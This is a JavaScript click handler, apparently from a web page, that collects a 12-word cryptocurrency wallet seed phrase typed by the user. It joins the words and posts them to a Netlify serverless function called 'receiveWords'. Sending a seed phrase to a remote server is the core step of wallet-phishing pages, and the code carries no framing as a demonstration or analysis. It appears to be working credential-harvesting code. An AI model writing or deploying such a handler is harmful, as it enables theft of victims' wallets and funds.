continueBtn.addEventListener('click', async () => {
    // Ensure we have exactly 12 words
    if (words.length !== TOTAL_WORDS) {
        console.log("Seed phrase incomplete");
        return;
    }

    const phrase = words.join(" ");

    try {
        const response = await fetch(".netlify/functions/receiveWords", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phrase })
        });

        const result = await response.json();
        console.log("Netlify function response:", result);

        // You can redirect or show a success message here
        // window.location.href = "/next-page.html";

    } catch (error) {
        console.error("Error sending phrase:", error);
    }
});
